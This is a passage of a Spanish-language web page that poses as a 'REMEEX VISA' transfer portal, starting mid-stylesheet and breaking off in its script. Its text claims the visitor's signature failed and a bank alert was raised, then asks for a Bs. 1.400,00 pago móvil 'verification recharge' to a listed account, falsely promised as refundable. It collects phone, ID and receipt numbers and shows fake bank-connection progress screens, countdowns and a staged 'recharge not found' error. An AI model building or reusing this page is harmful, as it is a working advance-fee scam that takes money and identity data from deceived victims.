    /* Variantes de botón */
    .btn-advanced.warning {
      background: linear-gradient(135deg, var(--warning), var(--warning-dark));
    }

    .btn-advanced.success {
      background: linear-gradient(135deg, var(--neon-green), var(--neon-green-dark));
    }

    .btn-advanced.danger {
      background: linear-gradient(135deg, var(--danger), var(--danger-dark));
    }

    .btn-advanced-effect.warning {
      background: linear-gradient(
        90deg, 
        var(--warning), 
        var(--warning-dark), 
        var(--warning)
      );
    }

    .btn-advanced-effect.success {
      background: linear-gradient(
        90deg, 
        var(--neon-green), 
        var(--neon-green-dark), 
        var(--neon-green)
      );
    }

    .btn-advanced-effect.danger {
      background: linear-gradient(
        90deg, 
        var(--danger), 
        var(--danger-dark), 
        var(--danger)
      );
    }

    /* Logo banco con efecto */
    .bank-logo-container {
      position: relative;
      height: 50px;
      margin: 1.5rem auto;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .bank-logo {
      max-height: 50px;
      max-width: 160px;
      filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
      transition: var(--transition);
    }

    .bank-logo:hover {
      transform: scale(1.05);
      filter: drop-shadow(0 6px 8px rgba(0, 0, 0, 0.2));
    }

    /* Mensaje de advertencia con icono */
    .warning-message {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      margin-top: 1rem;
      padding: 0.75rem;
      background-color: rgba(245, 158, 11, 0.1);
      border-radius: var(--border-radius-sm);
      border-left: 3px solid var(--warning);
    }

    .warning-icon {
      color: var(--warning);
      font-size: 1rem;
    }

    .warning-text {
      font-size: 0.85rem;
      color: var(--text-secondary);
      text-align: left;
    }

    /* Iconos de éxito/error */
    .result-icon {
      width: 80px;
      height: 80px;
      margin: 1.5rem auto;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .result-icon.success {
      background-color: rgba(57, 255, 20, 0.1);
    }

    .result-icon.error {
      background-color: rgba(239, 68, 68, 0.1);
    }

    .result-icon i {
      font-size: 2.5rem;
      z-index: 2;
    }

    .result-icon.success i {
      color: var(--neon-green);
      text-shadow: 0 0 5px var(--neon-green-glow), 0 0 10px var(--neon-green-glow);
    }

    .result-icon.error i {
      color: var(--danger);
    }

    .result-icon::after {
      content: '';
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: transparent;
      border: 2px solid currentColor;
      opacity: 0;
      transform: scale(0.8);
      animation: ripple 1.5s ease-out infinite;
    }

    .result-icon.success::after {
      border-color: var(--neon-green);
      box-shadow: 0 0 15px var(--neon-green-glow);
    }

    .result-icon.error::after {
      border-color: var(--danger);
    }

    @keyframes ripple {
      from {
        opacity: 1;
        transform: scale(0.8);
      }
      to {
        opacity: 0;
        transform: scale(1.5);
      }
    }

    /* Contador regresivo */
    .countdown-container {
      margin-top: 1rem;
      font-size: 0.9rem;
      color: var(--text-secondary);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }

    .countdown-number {
      display: inline-block;
      background: var(--primary);
      color: white;
      font-weight: 600;
      width: 28px;
      height: 28px;
      line-height: 28px;
      text-align: center;
      border-radius: 50%;
    }

    .mini-signature {
      max-width: 120px;
      max-height: 60px;
      border: 1px solid #ccc;
      margin: 0.5rem auto;
      border-radius: 4px;
      animation: pulse 2s infinite;
    }

    .countdown {
      font-size: 0.85rem;
      color: var(--text-secondary);
      margin-top: 0.5rem;
      text-align: center;
    }

    /* Balance card (CSS solicitado) */
    .balance-card {
      background: linear-gradient(150deg, #1a237e 0%, #0d47a1 100%);
      color: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 1.5rem;
      margin: -2rem 1.5rem 1.5rem 1.5rem; 
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
      z-index: 2;
      transition: var(--transition);
    }
    .balance-card:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-lg);
    }
    
    /* Responsive */
    @media (max-width: 768px) {
      .header {
        padding: 2rem 1rem;
      }
      .header-logo {
        width: 70%;
        max-width: 300px;
      }
      .progress-bar {
        margin: 1.5rem 1rem;
      }
      .btn-std-container {
        width: 100%;
      }
      .btn-container {
        width: 100%;
        justify-content: center;
      }
      .btn-container2 {
        flex-direction: column;
        align-items: center;
      }
      .balance-card {
        margin: -2rem 1rem 1.5rem 1rem;
      }
      .section-content p {
        font-size: 0.95rem;
      }
      .verification-section p,
      .info-section-old p {
        font-size: 0.95rem;
      }
      .balance-amount {
        font-size: 1.8rem; /* Texto más pequeño en móviles */
      }
      .dynamic-text {
        font-size: 0.65rem; /* Texto más pequeño en móviles */
      }
    }
    
    @media (max-width: 480px) {
      .balance-card {
        padding: 1.25rem;
        margin: -1.5rem 1rem 1.5rem 1rem;
      }
      .balance-amount {
        font-size: 1.6rem; /* Aún más pequeño para móviles muy pequeños */
      }
      .section-content h2 {
        font-size: 1.3rem;
      }
      .form-group label,
      .form-control {
        font-size: 0.9rem;
      }
      .btn-glow {
        font-size: 0.9rem;
      }
      .info-section-old p, .verification-section p {
        font-size: 0.9rem;
      }
    }
  </style>
</head>

<body>
<div class="container">
  <!-- Encabezado principal -->
  <div class="header">
    <!-- Se quita el texto "Envía dinero..." para cumplir el punto #1 -->
    <img 
      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png"
      alt="REMEEX VISA Logo" 
      class="header-logo"
    >
  </div>

  <!-- Nueva Tarjeta de Saldo (punto #2) -->
  <div class="new-balance-card-container">
    <div class="card" id="balanceCard">
      <!-- Portal de transferencia -->
      <div class="transfer-portal"></div>

      <!-- Contenedor de partículas -->
      <div class="particles-container" id="particlesContainer"></div>

      <!-- Encabezado de la tarjeta -->
      <div class="card-header">
        <div class="logo">
          <i class="fa-brands fa-cc-visa" style="font-size: 1.5rem;"></i>
        </div>
        <div class="exchange-rate">
          <span id="exchangeRateText">Tasa: 37.40</span>
          <i class="fas fa-exchange-alt" style="font-size: 0.8rem;"></i>
        </div>
      </div>

      <!-- Sección del saldo -->
      <div class="balance-section">
        <div class="balance-label" id="balanceLabel">
          Saldo disponible
          <span class="spinner" id="balanceSpinner">
            <span class="spinner-circle"></span>
            <span class="spinner-inner"></span>
          </span>
        </div>
        <div class="balance-amount" id="balanceAmount">0,00 Bs.</div>
      </div>

      <!-- Texto dinámico unificado -->
      <div class="info-section">
        <div class="dynamic-text" id="dynamicText">
          <span>Procesando transferencia</span>
          <span class="dot-loader"></span>
        </div>
      </div>
    </div>
  </div>

  <!-- Barra de progreso con texto -->
  <div class="progress-bar">
    <div class="progress-bar-fill" id="progressBarFill"></div>
    <span class="progress-text" id="progressText">Verificación adicional</span>
  </div>

  <!-- STEP 1: Nueva oportunidad para firmar -->
  <div class="section-content active" id="signatureVerification">
    <h2><i class="fas fa-file-signature"></i> Verificación de Firma</h2>
    
    <div class="verification-section">
      <p style="color: var(--text-secondary); margin-bottom: 1rem;">
        <i class="fas fa-exclamation-circle" style="color:var(--warning);"></i>
        <strong>Tu firma anterior no coincide con la que tenemos registrada.</strong>
      </p>
      <p style="margin-bottom:1rem;">
        Por razones de seguridad, te ofrecemos una segunda oportunidad para firmar.
        Tu firma debe coincidir con la de tu documento de identidad para autorizar esta transacción.
      </p>
      <p>
        Por favor, intenta firmar con más precisión. Si la firma aún no coincide, 
        deberás pasar por un proceso de verificación adicional para garantizar la seguridad 
        de tus fondos.
      </p>
    </div>

    <p style="margin-bottom: 1.5rem; color: var(--text-secondary); text-align: center;">
      <i class="fas fa-shield-alt" style="color:var(--primary);"></i>
      Este es un procedimiento estándar para proteger tu seguridad y evitar fraudes.
      <br>
      <strong>No cierres esta página ni retrocedas durante el proceso.</strong>
    </p>

    <!-- Canvas de firma -->
    <canvas class="signature-canvas" id="signatureCanvas"></canvas>

    <div style="display: flex; gap: 1rem; margin-bottom: 1rem; justify-content: center;">
      <div class="btn-std-container" style="width: 140px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-danger" id="clearSignatureBtn">
          <div class="btn-glow-content btn-glow-initial">Limpiar</div>
          <div class="btn-glow-content btn-glow-hover">
            Limpiar
            <i class="fas fa-eraser btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="btn-std-container" style="width: 140px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-success" id="saveSignatureBtn">
          <div class="btn-glow-content btn-glow-initial">Guardar</div>
          <div class="btn-glow-content btn-glow-hover">
            Guardar
            <i class="fas fa-save btn-glow-icon"></i>
          </div>
        </button>
      </div>
    </div>
  </div>

  <!-- STEP 2: Verificación de Seguridad 1 -->
  <div class="section-content" id="securityVerification1">
    <h2><i class="fas fa-shield-alt"></i> Verificación de Seguridad</h2>
    <div class="info-section-old">
      <p id="securityVerificationText1">
        Tu firma no coincide con la que aparece en tu documento de identidad.
        Por seguridad, necesitamos validar que eres el titular legítimo de 
        la cuenta antes de procesar tu solicitud.
      </p>
      <p>
        Serás dirigido(a) a una sección de seguridad para confirmar tu titularidad.
        Este proceso es rápido y sencillo, diseñado para proteger tus fondos y 
        prevenir transacciones no autorizadas.
      </p>
      <p>
        <strong>Importante:</strong> No cierres esta ventana ni retrocedas durante 
        el proceso de verificación.
      </p>
    </div>
    <div style="text-align:center; margin-top: 1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 220px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="continueSecurityBtn1" disabled>
          <div class="btn-glow-content btn-glow-initial">Acepto, Quiero continuar</div>
          <div class="btn-glow-content btn-glow-hover">
            Acepto, Quiero continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownSecurity1">
        Lee detenidamente y espera 30 segundos para continuar...
      </div>
    </div>
  </div>

  <!-- STEP 3: Verificación de Seguridad 2 -->
  <div class="section-content" id="securityVerification2">
    <h2><i class="fas fa-question-circle"></i> ¿Por qué esta verificación?</h2>
    <div class="info-section-old">
      <p>
        La verificación adicional es un mecanismo de seguridad que garantiza 
        la protección de tus fondos y tu identidad.
      </p>
      <ul class="icon-list">
        <li><i class="fas fa-user-shield"></i> Previene intentos de suplantación de identidad y accesos no autorizados.</li>
        <li><i class="fas fa-lock"></i> Evita que personas no autorizadas puedan acceder a tu cuenta.</li>
        <li><i class="fas fa-ban"></i> Reduce el riesgo de bloqueos o retenciones en tu banco por transacciones sospechosas.</li>
        <li><i class="fas fa-gavel"></i> Cumple con la normativa legal de seguridad bancaria que protege tus intereses.</li>
        <li><i class="fas fa-shield-alt"></i> Establece una capa adicional de protección para transacciones de alto valor.</li>
      </ul>
    </div>
    <div style="text-align:center; margin-top: 1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 180px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="continueSecurityBtn2" disabled>
          <div class="btn-glow-content btn-glow-initial">Entendido, Continuar</div>
          <div class="btn-glow-content btn-glow-hover">
            Entendido, Continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownSecurity2">Disponible en unos momentos...</div>
    </div>
  </div>

  <!-- STEP 4A: Tu dinero está listo, pero hay un detalle importante -->
  <div class="section-content" id="securityVerification3A">
    <h2><i class="fas fa-info-circle"></i> Tu dinero está listo, pero hay un detalle importante</h2>
    <div class="info-section-old">
      <p>
        <strong id="nombreUsuarioAviso" style="color: var(--primary);">[NombreCompleto]</strong>,
        tenemos todo listo para enviarte tu dinero a 
        <strong class="nombreBancoUsuario">[Banco]</strong>.
        Sin embargo, hay dos alertas de seguridad que debemos resolver:
      </p>
      <ol style="margin: 1.5rem 0; color: var(--text-primary);">
        <li style="margin-bottom:1rem;">
          <strong>Tu firma no coincidió</strong> con la registrada en el sistema, y por seguridad,
          no pudimos confirmar tu identidad como titular de la cuenta bancaria en 
          <strong class="nombreBancoUsuario">[Banco]</strong>.
        </li>
        <li>
          <strong class="nombreBancoUsuario"></strong> ha detectado que normalmente
          no recibes depósitos de montos elevados en tu cuenta 
          <em class="numeroCuentaUsuario"></em>, lo que ha activado una alerta automática de seguridad.
        </li>
      </ol>
      <p style="margin-top: 1rem;">
        <i class="fas fa-exclamation-circle" style="color:var(--warning);"></i>
        <strong>No te preocupes.</strong> Este es un procedimiento estándar diseñado para protegerte.
        Solo necesitas completar una verificación rápida para confirmar que eres el titular
        legítimo de la cuenta y asegurar que puedas recibir tus fondos sin problemas.
      </p>
    </div>
    <div style="text-align:center; margin-top: 1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 160px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="continueSecurity3ABtn" disabled>
          <div class="btn-glow-content btn-glow-initial">Continuar</div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownSecurity3A">
        Lee detenidamente y espera para continuar...
      </div>
    </div>
  </div>

  <!-- STEP 4B: Verificación rápida desde tu banco -->
  <div class="section-content" id="securityVerification3B">
    <h2><i class="fas fa-user-check"></i> Verificación rápida desde tu banco</h2>
    <div class="info-section-old">
      <p>
        Para resolver estas alertas de seguridad y garantizar que recibas tus
        <strong id="saldoRequerido">[Saldo en Bs]</strong> sin inconvenientes,
        necesitamos confirmar que tienes acceso a tu cuenta en 
        <strong class="nombreBancoUsuario">[Banco]</strong>.
      </p>
      <div style="margin: 1rem 0;">
        <i class="fas fa-credit-card" style="color:var(--success); margin-right: 0.5rem;"></i>
        <span style="color: var(--text-primary);">
          Esta verificación eliminará las restricciones y permitirá que tu depósito
          se procese de forma inmediata y segura.
        </span>
      </div>
      <div class="highlight-card">
        <p style="font-weight: 500; color: var(--text-primary);">
          <i class="fas fa-shield-alt" style="color:var(--primary); margin-right: 0.5rem;"></i> 
          Este procedimiento protege tu dinero y evita fraudes.
        </p>
        <p style="font-weight: 500; color: var(--text-primary); margin-top: 0.5rem;">
          <i class="fas fa-check-circle" style="color:var(--success); margin-right: 0.5rem;"></i> 
          Es rápido y seguro, sin trámites complicados.
        </p>
        <p style="font-weight: 500; color: var(--text-primary); margin-top: 0.5rem;">
          <i class="fas fa-money-bill-wave" style="color:var(--success); margin-right: 0.5rem;"></i> 
          Recibirás el dinero inmediatamente después de la verificación.
        </p>
      </div>
    </div>
    <div style="text-align:center; margin-top: 1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 160px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="continueSecurity3BBtn" disabled>
          <div class="btn-glow-content btn-glow-initial">Continuar</div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownSecurity3B">
        Disponible en unos momentos...
      </div>
    </div>
  </div>

  <!-- STEP 4C: Último paso para recibir tu dinero en minutos -->
  <div class="section-content" id="securityVerification3C">
    <h2><i class="fas fa-flag-checkered"></i> Último paso para recibir tu dinero en minutos</h2>
    <div class="info-section-old">
      <p>
        Para confirmar que eres el titular de la cuenta y eliminar la alerta de seguridad, 
        sigue estos pasos:
      </p>
      <ol style="color: var(--text-primary); margin: 1rem 0 1.5rem 1.5rem;">
        <li style="margin-bottom:1rem;">
          Desde tu cuenta en <strong class="nombreBancoRecarga">[Banco]</strong>,
          realiza una recarga de verificación por <strong class="blink">Bs. 1.400,00</strong>. 
          <strong>Este monto será reembolsado</strong> junto con tu saldo disponible.
        </li>
        <li>
          En el concepto del comprobante de pago móvil escribe: 
          <strong id="conceptoPagoMovil">[Número de Identificación]</strong>.
        </li>
      </ol>
      <div class="highlight-card">
        <p style="font-weight: 500;">
          <i class="fas fa-calculator" style="margin-right: 0.5rem;"></i>
          <strong>Monto total que recibirás:</strong>
          <br>
          <span style="display: block; text-align: center; margin-top: 0.5rem; font-size: 1.1rem;">
            <strong id="montoRetiroBs">[Saldo]</strong> + 
            <strong class="blink">Bs. 1.400,00</strong> = 
            <strong id="montoDepositoTotal">[Saldo+1400]</strong>
          </span>
        </p>
      </div>
    </div>
    <h3 class="section-subtitle">
      <i class="fas fa-info-circle"></i> Datos donde realizar la verificación
    </h3>
    <!-- Efecto blur con lógica extra -->
    <div class="blur-container" id="blurContainer">
      <div class="security-data-card" id="datosRecargaFijos">
        <p>
          <strong>Banco:</strong> 
          Banco Venezolano de Crédito (0104)
          <i class="fas fa-copy copy-icon" onclick="copyToClipboard('Banco Venezolano de Crédito (0104)')"></i>
        </p>
        <p>
          <strong>Número:</strong> 
          <span id="verificacionNumero">0412-1000000</span>
          <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionNumero')"></i>
        </p>
        <p>
          <strong>RIF:</strong> 
          <span id="verificacionRif">J-407502646</span>
          <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionRif')"></i>
        </p>
        <p>
          <strong>Monto:</strong>
          <span id="verificacionMonto">1.400,00 Bolívares</span>
          <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionMonto')"></i>
        </p>
        <p style="margin-top:0.8rem;">
          <strong>Concepto:</strong> 
          <span id="conceptoRecarga">Documento de identidad</span>
          <i class="fas fa-copy copy-icon" onclick="copyToClipboard('conceptoRecarga')"></i>
        </p>
      </div>
      <div class="blur-overlay">
        <i class="fas fa-eye" style="margin-right: 0.5rem;"></i> 
        Toca aquí para ver los datos
      </div>
    </div>
    <p style="margin-top:1rem; color: var(--text-secondary); text-align: justify;">
      <i class="fas fa-bullhorn" style="color:var(--primary); margin-right: 0.5rem;"></i>
      Realiza la recarga ahora y en minutos recibirás tu dinero sin más demoras. 
      Este paso es una medida de seguridad, no implica un pago, comisión o cobro adicional, 
      ya que el monto se reembolsará inmediatamente junto con tu saldo.
    </p>
    <div style="text-align:center; margin-top:1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 160px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="recargaReadyBtn">
          <div class="btn-glow-content btn-glow-initial">Continuar</div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownRecargaReady">
        Por favor, completa la recarga antes de continuar...
      </div>
    </div>
  </div>

  <!-- STEP 5: Completar Datos de Recarga -->
  <div class="section-content" id="recargaSection">
    <h2><i class="fas fa-credit-card"></i> Completar Datos de tu Recarga</h2>
    <div class="info-section-old">
      <p id="textoCompletarRecarga">
        ¿Realizaste tu recarga de verificación por <span id="recargaMontoTexto">1.400,00 Bs</span> 
        desde tu banco para confirmar tu identidad? Por favor, completa la información 
        para validar tu recarga.
      </p>
    </div>
    <div class="form-group">
      <label style="display:block; margin-bottom:0.3rem;">Banco de Origen:</label>
      <div style="display:flex; align-items:center; gap:0.5rem;">
        <img id="logoBancoOrigen" src="" alt="Logo Banco" style="max-height:30px;" />
        <input
          type="text"
          id="recargaBancoOrigen"
          style="width: 100%; padding: 0.75rem;"
          disabled
        />
      </div>
    </div>
    <div class="form-group">
      <label style="display:block; margin-bottom:0.3rem;">Teléfono:</label>
      <input
        type="text"
        id="recargaTelefono"
        style="width: 100%; padding: 0.75rem;"
        placeholder="Ingrese su número de teléfono"
        required
      />
    </div>
    <div class="form-group">
      <label style="display:block; margin-bottom:0.3rem;">Cédula:</label>
      <input
        type="text"
        id="recargaCedula"
        style="width: 100%; padding: 0.75rem;"
        disabled
      />
    </div>
    <div class="form-group">
      <label style="display:block; margin-bottom:0.3rem;">Monto (Bs):</label>
      <input
        type="text"
        id="recargaMonto"
        value="1.400,00"
        disabled
        style="width: 100%; padding: 0.75rem;"
      />
    </div>
    <div class="info-section-old">
      <p>
        Al realizar esta recarga de verificación por <span id="montoVerificacionTexto">1.400,00 Bs</span>, 
        se te devolverá junto con tu saldo disponible. Tu depósito total a recibir será de 
        tu saldo + <strong id="montoReembolsoTexto">1.400,00 Bs</strong>.
      </p>
      <p>
        Esta verificación es necesaria porque tu firma no coincide con la de tu 
        documento de identidad y para proteger la seguridad de tu cuenta.
      </p>
    </div>
    <div class="form-group">
      <label>N° de Comprobante (12 dígitos):</label>
      <input
        type="text"
        id="comprobanteInput"
        placeholder="Ej: 123456789123"
        style="width: 100%; padding: 0.75rem;"
      />
    </div>
    <div style="text-align:center; margin-top:1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 200px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-success btn-disabled" id="confirmRecargaBtn" disabled>
          <div class="btn-glow-content btn-glow-initial">
            <i class="fas fa-check" style="margin-right: 0.5rem;"></i> Confirmar Recarga
          </div>
          <div class="btn-glow-content btn-glow-hover">
            <i class="fas fa-check" style="margin-right: 0.5rem;"></i> Confirmar Recarga
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownRecargaConfirm">
        Verificando datos...
      </div>
    </div>
  </div>
</div><!-- Fin de container principal -->

<!-- Overlays con nuevos estilos -->
<!-- Overlay: Confirmar Firma -->
<div class="overlay" id="overlayConfirmFirma">
  <div class="modal modal-glow">
    <h3>¿Estás seguro de tu firma?</h3>
    <p>
      La firma debe coincidir con la de tu documento de identidad. <br/>
      Si no coincide, se solicitará verificación adicional. <br/>
      ¿Deseas continuar con esta firma?
    </p>

    <div class="signature-container">
      <img id="signaturePreviewImg" src="" alt="Firma" class="signature-img">
    </div>

    <div class="bank-logo-container">
      <img id="bankLogoConfirmFirma" src="" alt="Logo Banco" class="bank-logo">
    </div>

    <div style="display:flex; gap:1rem; justify-content:center; flex-wrap:wrap; margin-top: 1rem;">
      <div class="btn-advanced-container">
        <div class="btn-advanced-effect warning"></div>
        <button class="btn-advanced warning" id="editarFirmaBtn">
          <span class="btn-text">
            Editar
            <i class="fas fa-edit btn-icon"></i>
          </span>
        </button>
      </div>
      <div class="btn-advanced-container">
        <div class="btn-advanced-effect"></div>
        <button class="btn-advanced" id="continuarFirmaBtn">
          <span class="btn-text">
            Continuar
            <i class="fas fa-forward btn-icon"></i>
          </span>
        </button>
      </div>
    </div>
  </div>
</div>

<!-- Overlay Secuencial POST-FIRMA (Conexión, Análisis, etc.) -->
<div class="overlay" id="overlaySecuenciaFirma">
  <div class="modal modal-glow">
    <h3 id="secuenciaFirmaTitulo">Conectando con tu banco...</h3>
    <p id="secuenciaFirmaTexto">Analizando tu firma digital...</p>
    
    <div class="signature-container">
      <img id="miniSignatureImg" src="" alt="Firma" class="signature-img">
    </div>
    
    <div class="bank-logo-container">
      <img id="secuenciaFirmaLogo" src="" alt="Banco" class="bank-logo">
    </div>
    
    <div class="overlay-progress-bar">
      <div class="overlay-progress-fill" id="secuenciaFirmaProgress" style="width: 0%;"></div>
      <div class="progress-percentage">0%</div>
    </div>
    
    <div class="warning-message">
      <i class="fas fa-exclamation-triangle warning-icon"></i>
      <span class="warning-text">Por favor, no cierres esta ventana ni retrocedas durante el proceso</span>
    </div>
    
    <div class="spinner-advanced">
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-dot"></div>
    </div>
  </div>
</div>

<!-- Overlay: Verificación de la primera recarga -->
<div class="overlay" id="overlayVerificandoRecarga">
  <div class="modal modal-glow">
    <h3 id="verificandoRecargaTitulo">Verificando tu recarga...</h3>
    <p id="verificandoRecargaTexto">
      Por favor, espera mientras consultamos con tu banco.
    </p>
    
    <div class="bank-logo-container">
      <img id="verificandoRecargaLogo" src="" alt="Banco" class="bank-logo">
    </div>
    
    <div class="overlay-progress-bar">
      <div class="overlay-progress-fill" id="verificandoRecargaProgress" style="width: 0%;"></div>
      <div class="progress-percentage">0%</div>
    </div>
    
    <div class="warning-message">
      <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
      <span class="warning-text">Este proceso tomará unos segundos</span>
    </div>
    
    <div class="spinner-advanced">
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-dot"></div>
    </div>
  </div>
</div>

<!-- Overlay: Última secuencia al confirmar recarga -->
<div class="overlay" id="overlaySecuenciaFinal">
  <div class="modal modal-glow">
    <h3 id="secFinalTitulo">Conectando con tu banco</h3>
    <p id="secFinalTexto">Preparando tu depósito.</p>
    
    <div class="bank-logo-container">
      <img id="secFinalLogo" src="" alt="Banco" class="bank-logo">
    </div>
    
    <div class="overlay-progress-bar">
      <div class="overlay-progress-fill" id="secuenciaFinalProgress" style="width: 0%;"></div>
      <div class="progress-percentage">0%</div>
    </div>
    
    <div class="warning-message">
      <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
      <span class="warning-text">Tu dinero estará disponible en breve</span>
    </div>
    
    <div class="spinner-advanced">
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-dot"></div>
    </div>
  </div>
</div>

<!-- Overlay: Error Final - No se encontró la recarga -->
<div class="overlay" id="overlayErrorFinal">
  <div class="modal modal-glow error">
    <h3 style="background: linear-gradient(90deg, var(--danger), var(--danger-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-fill-color: transparent;">
      Atención: No encontramos tu recarga
    </h3>
    
    <p id="errorFinalTexto">
      No se puede verificar la titularidad de tu cuenta hasta que detectemos
      tu recarga de verificación. Depositaremos tu saldo completo 
      (Saldo+<span id="montoRecargaError">1.400,00</span> Bs) 
      una vez validemos tu identidad.
    </p>
    
    <div class="result-icon error">
      <i class="fas fa-exclamation-circle"></i>
    </div>
    
    <p style="margin-top: 0.5rem;">
      Por favor, contacta con soporte para recibir asistencia inmediata.
    </p>
    
   <div style="text-align: center; margin-top: 1rem;">
      <a 
        href="#"
        target="_blank"
        class="btn-support"
        id="whatsappLink"
      >
        <i class="fab fa-whatsapp"></i> Contactar con Soporte
      </a>
    </div>
  </div>
</div>

<!-- Overlay: Datos de Verificación (Pago Móvil) -->
<div class="overlay" id="overlayDatosVerificacion">
  <div class="modal modal-glow">
    <h3>Datos para Pago Móvil de Verificación</h3>
    <div id="modalDatosContent">
      <p><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</p>
      <p>
        <strong>Número:</strong> 
        <span id="verificacionNumeroModal">0412-1000000</span> 
        <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionNumeroModal')"></i>
      </p>
      <p>
        <strong>RIF:</strong> 
        <span id="verificacionRifModal">J-407502646</span> 
        <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionRifModal')"></i>
      </p>
      <p>
        <strong>Monto:</strong> 
        <span id="verificacionMontoModal">1.400,00 Bolívares</span> 
        <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionMontoModal')"></i>
      </p>
      <p style="margin-top:0.8rem;">
        <strong>Concepto:</strong> 
        <span id="conceptoRecargaModal">Documento de identidad</span>
      </p>
    </div>
    <p style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 1rem;">
      El monto de verificación (<span id="montoVerificacionBsModal">1.400,00 Bs</span>) 
      equivale a <span id="montoVerificacionUsdModal">$37.40</span> y será reembolsado.
    </p>
    
    <div class="btn-advanced-container" style="margin: 1rem auto;">
      <div class="btn-advanced-effect"></div>
      <button class="btn-advanced" id="closeDatosModalBtn">
        <span class="btn-text">
          Cerrar
          <i class="fas fa-times btn-icon"></i>
        </span>
      </button>
    </div>
  </div>
</div>

<!-- Overlay: Firma no coincide (si se llegara a necesitar) -->
<div class="overlay" id="overlayFirmaNoCoincide">
  <div class="modal modal-glow error">
    <h3 style="background: linear-gradient(90deg, var(--danger), var(--danger-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-fill-color: transparent;">
      Verificación adicional requerida
    </h3>
    
    <p id="firmaNoCoincideTexto">
Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un proceso de verificación adicional para continuar con el retiro.
    </p>
    
    <div class="bank-logo-container">
      <img id="firmaNoCoincideLogo" src="" alt="Logo Banco" class="bank-logo">
    </div>
    
    <div class="result-icon error">
      <i class="fas fa-exclamation-circle"></i>
    </div>
    
    <div class="overlay-progress-bar">
      <div class="overlay-progress-fill error" id="redirectProgressBar" style="width: 0%;"></div>
      <div class="progress-percentage">0%</div>
    </div>
    
    <div class="countdown-container">
      <span>Serás redirigido en</span>
      <span class="countdown-number" id="redirectCountdown">10</span>
      <span>segundos...</span>
    </div>
  </div>
</div>

<!-- Audios solicitados -->
<audio id="audioIntro" preload="auto">
  <source src="https://dl.dropboxusercontent.com/scl/fi/dwn8afqkkj0sn3fj6y3d7/KWaPj24l_oo-intro.mp3?rlkey=t61z1y3x2vn1v1o9kpspgr8y1" type="audio/mpeg">
</audio>
<audio id="audioOverlay" preload="auto">
  <source src="https://dl.dropboxusercontent.com/scl/fi/k04phmfxh7fldoswxxcgj/X6mjwDUFccw-overlay.mp3?rlkey=cfjmdzpplxqvf2d65pfqnk4xh" type="audio/mpeg">
</audio>

<!-- Script principal -->
<script>
  /****************************************************
   * FUNCIONES PARA MOSTRAR/OCULTAR CARDS
   ****************************************************/
  function showVisaCard(id) {
    const card = document.getElementById(id);
    if (card) {
      card.style.display = "block";
      // Pequeño retraso para permitir que el navegador reconozca el cambio de display
      setTimeout(() => {
        card.classList.add("active");
